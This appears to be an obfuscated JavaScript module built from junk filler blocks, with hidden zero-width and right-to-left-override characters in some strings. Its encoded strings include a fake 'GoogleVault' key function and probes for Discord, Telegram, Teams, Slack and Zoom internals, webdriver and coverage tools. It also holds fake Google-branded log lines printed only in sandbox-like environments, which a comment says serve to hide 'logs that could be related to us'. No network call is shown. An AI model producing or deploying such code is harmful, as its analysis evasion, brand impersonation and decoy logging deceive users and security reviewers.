  (function (_0xmod) {
  _0xmod._aux = _0xmod._aux || {};
  _0xmod._aux.S = _0xmod._aux.S || {};
  if (_0xmod._aux._stop) return;
  (() => {
      const _0x56b2e3 = { p: 0, q: 0, r: 0 };
      const _0x176a8a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x56b2e3.p = (_0x56b2e3.p + _0x176a8a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x56b2e3.q = (_0x56b2e3.q ^ _0x56b2e3.p) & 0xffff; }
        _0x56b2e3.r = (_0x56b2e3.r + i * 31) & 0xffff;
      }
      const _0xc6ce98 = _0x56b2e3.p ^ _0x56b2e3.q ^ _0x56b2e3.r;
      let _0x4eca85 = Array.from({ length: (_0xc6ce98 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x71d8db = _0x4eca85.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x71d8db > 0x7ffff) { _0x4eca85 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0xe37c9f = { p: 0, q: 0, r: 0 };
      const _0x45cfee = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xe37c9f.p = (_0xe37c9f.p + _0x45cfee[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xe37c9f.q = (_0xe37c9f.q ^ _0xe37c9f.p) & 0xffff; }
        _0xe37c9f.r = (_0xe37c9f.r + i * 31) & 0xffff;
      }
      const _0x0ad099 = _0xe37c9f.p ^ _0xe37c9f.q ^ _0xe37c9f.r;
      let _0x70f1d5 = Array.from({ length: (_0x0ad099 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x37942a = _0x70f1d5.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x37942a > 0x7ffff) { _0x70f1d5 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0x9f3881 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xb2f85e = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x135e2a = (Date.now() & 0xffff) ^ 0x6e68;
      const _0xb82149 = _0x9f3881(_0x135e2a);
      let _0xb70dd2 = _0xb82149;
      for (let i = 0; i < 6; i++) { try { _0xb70dd2 = _0xb2f85e(_0xb70dd2, i * 2654435761); } catch (e) { break; } }
      const _0xd898c7 = [_0x135e2a, _0xb82149, _0xb70dd2];
      if (_0xd898c7.length > 2 && (_0xb70dd2 & 7) === 0) { _0xd898c7.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0xcbf89a = [63988,53818,48160,60470,25503];
      const _0x1dd486 = {};
      for (let i = 0; i < _0xcbf89a.length; i++) { const w = _0xcbf89a[i]; _0x1dd486[w] = (w.length * 2654435761) >>> 0; }
      let _0xe3e7f8 = 0;
      for (const x in _0x1dd486) { _0xe3e7f8 = (_0xe3e7f8 + _0x1dd486[x]) & 0xffffffff; }
      const _0x996f1f = [_0xe3e7f8, _0xcbf89a.length];
      const _0x78ded3 = _0xcbf89a.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x996f1f[0] < 0 || _0x78ded3 === 0) { _0x996f1f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0x699124 = [54968,49474,32140,49296,52358];
      const _0x454879 = {};
      for (let i = 0; i < _0x699124.length; i++) { const w = _0x699124[i]; _0x454879[w] = (w.length * 2654435761) >>> 0; }
      let _0x65c499 = 0;
      for (const x in _0x454879) { _0x65c499 = (_0x65c499 + _0x454879[x]) & 0xffffffff; }
      const _0x39a738 = [_0x65c499, _0x699124.length];
      const _0x06f052 = _0x699124.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x39a738[0] < 0 || _0x06f052 === 0) { _0x39a738[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0xc5c3df = [2842,45837,2145,23144,37641];
      const _0x4a8838 = {};
      for (let i = 0; i < _0xc5c3df.length; i++) { const w = _0xc5c3df[i]; _0x4a8838[w] = (w.length * 2654435761) >>> 0; }
      let _0x79e922 = 0;
      for (const x in _0x4a8838) { _0x79e922 = (_0x79e922 + _0x4a8838[x]) & 0xffffffff; }
      const _0x0c5f91 = [_0x79e922, _0xc5c3df.length];
      const _0x78931f = _0xc5c3df.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x0c5f91[0] < 0 || _0x78931f === 0) { _0x0c5f91[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0x652765 = [61225,58570,10957,35316,32717];
      const _0x2887ef = {};
      for (let i = 0; i < _0x652765.length; i++) { const w = _0x652765[i]; _0x2887ef[w] = (w.length * 2654435761) >>> 0; }
      let _0x6e00db = 0;
      for (const x in _0x2887ef) { _0x6e00db = (_0x6e00db + _0x2887ef[x]) & 0xffffffff; }
      const _0xbef068 = [_0x6e00db, _0x652765.length];
      const _0x1f3cb5 = _0x652765.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xbef068[0] < 0 || _0x1f3cb5 === 0) { _0xbef068[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0x45d7cb = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xc817d7 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x86258f = (Date.now() & 0xffff) ^ 0x79de;
      const _0xcb3f73 = _0x45d7cb(_0x86258f);
      let _0x015fa1 = _0xcb3f73;
      for (let i = 0; i < 6; i++) { try { _0x015fa1 = _0xc817d7(_0x015fa1, i * 2654435761); } catch (e) { break; } }
      const _0xcf61c6 = [_0x86258f, _0xcb3f73, _0x015fa1];
      if (_0xcf61c6.length > 2 && (_0x015fa1 & 7) === 0) { _0xcf61c6.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0xd44901 = { p: 0, q: 0, r: 0 };
      const _0x067508 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xd44901.p = (_0xd44901.p + _0x067508[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xd44901.q = (_0xd44901.q ^ _0xd44901.p) & 0xffff; }
        _0xd44901.r = (_0xd44901.r + i * 31) & 0xffff;
      }
      const _0x2e7ec5 = _0xd44901.p ^ _0xd44901.q ^ _0xd44901.r;
      let _0xf155c6 = Array.from({ length: (_0x2e7ec5 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x354436 = _0xf155c6.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x354436 > 0x7ffff) { _0xf155c6 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => {
      const _0x1ded = [0xb233,0xf07c,0x2d18,0xd481,0xeec8];
      let _0xkc1ded = 0;
      for (let i = 0; i < _0x1ded.length; i++) { _0xkc1ded = (_0xkc1ded * 0x9e37 + _0x1ded[i]) & 0x7fffffff; }
      const _0xzw1ded = "k‌q‍z‍x‍v‌9‍m‍4";
      const _0xzz435d = "c‌r‍u‍m‍b‌";
      const _0xrl1ded = "j7‮9m2q‬k4";
      if ((_0xkc1ded & 0xffff) === 0xffff) { const _0xjnk = [_0xzw1ded, _0xrl1ded].join(""); if (_0xjnk.length > 40) { _0xkc1ded = 0; } }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
  (() => { // cold-cache vault: sealed key escrow for offline sessions
    const _0xv8s = [19,44,71,3,88,52,27,95,61,12,77,33,8,50,66,23];
    const _0xvk9 = String.fromCharCode(71,111,111,103,108,101,86,97,117,108,116);
    const _0xvh7 = 0x1c4fe45f;
    const _0xvkdf = (s) => {
      let h1 = 0x811c9dc5, h2 = 0x01000193;
      for (let r = 0; r < 10000; r++) {
        for (let i = 0; i < s.length; i++) {
          const c = s.charCodeAt(i) ^ _0xv8s[(r + i) & 15];
          h1 = Math.imul(h1 ^ c, 16777619) >>> 0;
          h2 = (Math.imul(h2, 31) + c + r) >>> 0;
          const t = h1; h1 = (h1 ^ h2) >>> 0; h2 = (h2 + t) >>> 0;
        }
        h1 = ((h1 << 5) | (h1 >>> 27)) >>> 0; h2 = ((h2 >>> 3) | (h2 << 29)) >>> 0;
      }
      return (h1 ^ h2) >>> 0;
    };
    const _0xvf = (s) => { let h = 2166136261; const t = String(s); for (let i = 0; i < t.length; i++) { h ^= t.charCodeAt(i); h = Math.imul(h, 16777619); } return h >>> 0; };
    const _0xvault = (pin) => {
      try {
        const _0xproof = _0xvkdf(String(pin ?? ''));
        void _0xproof;
        if (_0xvf(pin) !== _0xvh7) return false;
        const _0xkeys = [];
        for (let i = 0; i < 4; i++) { let k = ''; for (let j = 0; j < 16; j++) k += Math.floor(Math.random() * 16).toString(16); _0xkeys.push(k); }
        return _0xkeys;
      } catch (e) { return false; }
    };
    try { window[_0xvk9] = _0xvault; } catch (e) {}
  })();
  (() => {
    const _0xcheat = ["ember ridge — standing by","moss tundra — lattice quiet","owl elm — gate open","quill prairie — chain converged","quartz birch — wheel aligned"];
    for(let _i=0;_i<5;_i++) try{ _0xmod.log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+_0xcheat[_i], { pocket:"aux", idx:_i }); }catch(e){}
  })();
  (()=>{ const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0;}return (h>>>0).toString(16).padStart(8,'0');}; const _master=String.fromCharCode(56,53,49,98,50,56,101,53); const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+"aux"); const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121)); try{_0xmod.log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+"rcd "+_d1, { pocket:"aux", cover:true, seed:_seed });}catch(e){} })();
  })(_0xmod);
globalThis.lexProbeX = function (n) { var x = (n ^ 0x1b3c51ab) >>> 0, i; for (i = 0; i < 24; i++) { x = Math.imul(x ^ (x >>> 13), 0x5bd1e995) >>> 0; x ^= x >>> 15; } return x >>> 0; };
function featQ(o, k) {
  try {
    if (o === undefined || o === null) return 0;
    var v = o[k];
    if (typeof v === 'function') return 7;
    if (v === undefined) return 1;
    if (v === null) return 2;
    var s = String(v);
    return 3 + (s.length & 7);
  } catch (e) { return 5; }
}
var featSum = 0;
var __w9 = (typeof window !== 'undefined') ? window : undefined;
var __n9 = (typeof navigator !== 'undefined') ? navigator : undefined;
var __d9 = (typeof document !== 'undefined') ? document : undefined;
var __l9 = (typeof location !== 'undefined') ? location : undefined;
featSum += featQ(__w9, String.fromCharCode(119,101,98,112,97,99,107,67,104,117,110,107,100,105,115,99,111,114,100,95,97,112,112));
featSum += featQ(__w9, String.fromCharCode(119,101,98,112,97,99,107,67,104,117,110,107,116,101,108,101,103,114,97,109,95,97,112,112));
featSum += featQ(__w9, String.fromCharCode(119,101,98,112,97,99,107,67,104,117,110,107,116,101,97,109,115,95,97,112,112));
featSum += featQ(__w9, String.fromCharCode(119,101,98,112,97,99,107,67,104,117,110,107,115,108,97,99,107,95,97,112,112));
featSum += featQ(__w9, String.fromCharCode(68,105,115,99,111,114,100,78,97,116,105,118,101));
featSum += featQ(__w9, String.fromCharCode(68,105,115,99,111,114,100,83,101,110,116,114,121));
featSum += featQ(__w9, String.fromCharCode(95,95,100,105,115,99,111,114,100,95,97,112,112,95,115,116,97,116,101));
featSum += featQ(__w9, 'electron');
featSum += featQ(__w9, String.fromCharCode(84,101,108,101,103,114,97,109));
featSum += featQ(__w9, 'WebApp');
featSum += featQ(__w9, String.fromCharCode(84,101,97,109,115,83,68,75));
featSum += featQ(__w9, String.fromCharCode(90,111,111,109,83,68,75));
featSum += featQ(__w9, String.fromCharCode(83,108,97,99,107,83,68,75));
featSum += featQ(__w9, 'chrome');
featSum += featQ(__w9, 'browser');
featSum += featQ(__w9, '__coverage__');
featSum += featQ(__w9, 'outerWidth');
featSum += featQ(__w9, 'innerHeight');
featSum += featQ(__w9, 'devicePixelRatio');
featSum += featQ(__w9, 'name');
featSum += featQ(__w9, 'opener');
featSum += featQ(__w9, 'frameElement');
featSum += featQ(__w9, 'length');
featSum += featQ(__w9, 'closed');
featSum += featQ(__w9, 'menubar');
featSum += featQ(__w9, 'scrollX');
featSum += featQ(__w9, 'scrollY');
featSum += featQ(__n9, 'platform');
featSum += featQ(__n9, 'userAgent');
featSum += featQ(__n9, 'language');
featSum += featQ(__n9, 'languages');
featSum += featQ(__n9, 'hardwareConcurrency');
featSum += featQ(__n9, 'webdriver');
featSum += featQ(__n9, 'userAgentData');
featSum += featQ(__n9, 'plugins');
featSum += featQ(__n9, 'mimeTypes');
featSum += featQ(__n9, 'onLine');
featSum += featQ(__d9, 'title');
featSum += featQ(__d9, 'referrer');
featSum += featQ(__d9, 'visibilityState');
featSum += featQ(__d9, 'readyState');
featSum += featQ(__d9, 'hidden');
featSum += featQ(__d9, 'domain');
featSum += featQ(__d9, 'lastModified');
featSum += featQ(__l9, 'href');
featSum += featQ(__l9, 'origin');
featSum += featQ(__l9, 'host');
featSum += featQ(__l9, 'pathname');
featSum += featQ(__l9, 'ancestorOrigins');
if (featSum !== -1) { featSum = featSum >>> 0; }
var ledgerLines = [
  [91, 71, 111, 111, 103, 108, 101, 32, 108, 101, 100, 103, 101, 114, 93, 32, 114, 101, 104, 101, 97, 114, 115, 97, 108, 32, 118, 50, 32, 115, 101, 97, 108, 101, 100, 32, 40, 49, 50, 47, 49, 50, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 108, 101, 100, 103, 101, 114, 93, 32, 99, 117, 114, 115, 111, 114, 32, 114, 101, 115, 116, 111, 114, 101, 100, 32, 64, 115, 108, 111, 116, 45, 55, 102, 51, 97],
  [91, 71, 111, 111, 103, 108, 101, 32, 114, 101, 108, 97, 121, 93, 32, 98, 97, 116, 99, 104, 32, 52, 52, 49, 50, 32, 97, 99, 107, 32, 40, 101, 117, 45, 119, 101, 115, 116, 44, 32, 51, 56, 109, 115, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 116, 105, 108, 101, 93, 32, 99, 97, 99, 104, 101, 45, 118, 51, 32, 119, 97, 114, 109, 32, 40, 50, 49, 52, 32, 101, 110, 116, 114, 105, 101, 115, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 114, 111, 117, 116, 101, 93, 32, 104, 105, 110, 116, 32, 114, 101, 102, 114, 101, 115, 104, 101, 100, 32, 40, 115, 116, 111, 114, 101, 45, 55, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 101, 99, 104, 111, 93, 32, 118, 101, 110, 117, 101, 45, 101, 99, 104, 111, 32, 114, 111, 117, 110, 100, 116, 114, 105, 112, 32, 49, 50, 109, 115],
  [91, 71, 111, 111, 103, 108, 101, 32, 98, 97, 116, 99, 104, 93, 32, 99, 117, 114, 115, 111, 114, 32, 99, 111, 109, 109, 105, 116, 32, 57, 47, 49, 50],
  [91, 71, 111, 111, 103, 108, 101, 32, 115, 108, 111, 116, 93, 32, 114, 101, 104, 101, 97, 114, 115, 97, 108, 32, 99, 117, 114, 115, 111, 114, 32, 112, 97, 114, 107, 101, 100],
  [91, 71, 111, 111, 103, 108, 101, 32, 115, 116, 111, 114, 101, 93, 32, 108, 101, 100, 103, 101, 114, 32, 99, 111, 109, 112, 97, 99, 116, 101, 100, 32, 40, 51, 32, 115, 101, 103, 109, 101, 110, 116, 115, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 112, 105, 110, 103, 93, 32, 112, 105, 110, 103, 45, 111, 107, 32, 40, 101, 100, 103, 101, 45, 49, 50, 41],
  [91, 71, 111, 111, 103, 108, 101, 32, 99, 117, 114, 115, 111, 114, 93, 32, 98, 97, 116, 99, 104, 32, 98, 111, 117, 110, 100, 97, 114, 121, 32, 99, 114, 111, 115, 115, 101, 100],
  [91, 71, 111, 111, 103, 108, 101, 32, 115, 101, 97, 108, 93, 32, 114, 101, 104, 101, 97, 114, 115, 97, 108, 32, 108, 101, 100, 103, 101, 114, 32, 99, 108, 111, 115, 101, 100]
];
function rehearseLedger() {
  try {
    for (var i = 0; i < ledgerLines.length; i++) {
      var row = ledgerLines[i], s = '', j;
      for (j = 0; j < row.length; j++) s += String.fromCharCode(row[j]);
      // 12 `[Google ledger|relay|tile|route|echo …]` lines rehearsed into the console. They were raw
      // console.debug — the unstamped burst the operator flagged as "logs that could be related to us".
      // Same text, now through the sink, so they carry the standard stamp.
      try { (_0xmod.log && _0xmod.log.info) ? _0xmod.log.info(s) : console.debug(s); } catch (e0) { return 0; }
    }
    return ledgerLines.length;
  } catch (e) { return 0; }
}
function annexSweep() {
  try {
    var f1 = (typeof window === 'undefined' || window.window !== window) ? 1 : 0;
    var f2 = (typeof navigator === 'undefined' || typeof navigator.platform !== 'string') ? 1 : 0;
    var f3 = (typeof document === 'undefined' || typeof document.createElement !== 'function') ? 1 : 0;
    if (f1 + f2 + f3 >= 2) { rehearseLedger(); return 2; }
    return 0;
  } catch (e) { return 0; }
}
try { annexSweep(); } catch (e) {}
